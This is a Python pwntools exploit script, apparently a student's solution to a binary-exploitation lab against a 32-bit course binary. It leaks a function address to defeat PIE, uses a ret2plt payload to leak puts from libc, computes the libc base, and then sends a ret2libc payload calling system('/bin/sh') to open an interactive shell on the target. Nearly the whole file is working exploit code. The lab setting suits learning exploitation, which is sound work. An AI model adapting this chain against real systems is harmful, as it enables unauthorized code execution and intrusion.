#!/usr/bin/env python3
from sys import argv
from pwn import *
import vpn_conf
import re

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 10)

EXE_FILENAME = '../pwn_student_binaries/call_me_Federico-Conti'
LIBC_FILENAME = '../pwn_student_binaries/remote-libc/32-bits/libc.so.6'
LD_FILENAME = '../pwn_student_binaries/remote-libc/32-bits/ld-linux.so.2'
argv = [EXE_FILENAME]
envp = {}

OFFSET_RIP = 192  # thanks pwn cyclic :)
OFFSET_EBX = OFFSET_RIP - 8 # Quiz function PUSH EBX register after EIP and EBP and contine the GOT adress so we cant overwrite it during the stage of the exploit

context.binary = e = ELF(EXE_FILENAME, checksec=False)
libc = ELF(LIBC_FILENAME, checksec=False)


def start():
    gdbscript = '''
    tbreak *__libc_start_main
    continue
    '''
    if args.GDB:
        return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process([LD_FILENAME, EXE_FILENAME],
                       env={'LD_PRELOAD': LIBC_FILENAME})
io = start()

# LEAK 1: flag() absolute address to calculate PIE base and GOT address 
                                    
lyrics = [
    b"Color me your color, baby",
    b"Color me your car",
    b"Color me your color, darling",
]

for idx, line in enumerate(lyrics, 1):
    io.sendlineafter(f"Enter line #{idx}:".encode(), line)

## &target= 0xflag()Address
data = io.recvuntil(b"Enter line #4:")
text = data.decode(errors="ignore")

match = re.search(r"0x[0-9a-fA-F]+", text)
if not match:
    log.failure("No address found in output")
    io.close()
    exit(1)

leak_flagAddr = int(match.group(0), 16)
log.success(f"LEAK1 flag() absolute address: {hex(leak_flagAddr)}")

### Note: in Ghidra set Windows/Memory Map/Set Image Base = 0
pie_base = leak_flagAddr - 0x11ed ## 0x11ed is a flag() offset compared to the PIE base (thanks Ghidra) 
got_addr = pie_base + 0x3fb4 # 0x3fb4 is the GOT address offset compared to the PIE base (thanks Ghidra; we can find in Program Tree/.got section )

log.info(f"PIE base: {hex(pie_base)}")
log.info(f"GOT addr: {hex(got_addr)}")


### Useful PLT/GOT addresses
puts_plt = pie_base + e.plt.puts
puts_got = pie_base + e.got.puts
quiz = pie_base + 0x12f8  # 0x12f8 is the quiz() offset compared to the PIE base (thanks Ghidra)

log.info(f"puts@plt = {hex(puts_plt)}")
log.info(f"puts@got = {hex(puts_got)}")
log.info(f"quiz()   = {hex(quiz)}")


# LEAK 2: puts@libc absolute address

payload  = b"a" * OFFSET_EBX
payload += p32(got_addr)           # KEEP EBX UNTOUCHED
payload += b"b" * 4                # padding for EBP
payload += p32(puts_plt)           # EIP -> puts@plt 
payload += p32(quiz)               # return address -> quiz() to repeat the process
payload += p32(puts_got)           # argument for puts@plt

io.sendline(payload)

leaked_puts = io.recvline().strip()[:4]
leaked_puts_addr = u32(leaked_puts.ljust(4, b"\x00"))
log.success(f"LEAK2 puts@libc absolute address: {hex(leaked_puts_addr)}")


## Calculate libc base absolute address
libc_base = leaked_puts_addr - libc.symbols['puts']
log.info(f"libc base: {hex(libc_base)}")

## Find system and "/bin/sh"  absolute addresses
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
log.info(f"system: {hex(system_addr)}")
log.info(f"/bin/sh: {hex(binsh_addr)}")


payload2  = b"A" * OFFSET_EBX
payload2 += p32(got_addr)      # KEEP EBX UNTOUCHED
payload2 += b"B" * 4           # padding for EBP
payload2 += p32(system_addr)   # EIP -> system
payload2 += p32(0)             # return address not used but needed by calling convention
payload2 += p32(binsh_addr)    # argument for system("/bin/sh")

io.sendline(payload2)
io.interactive()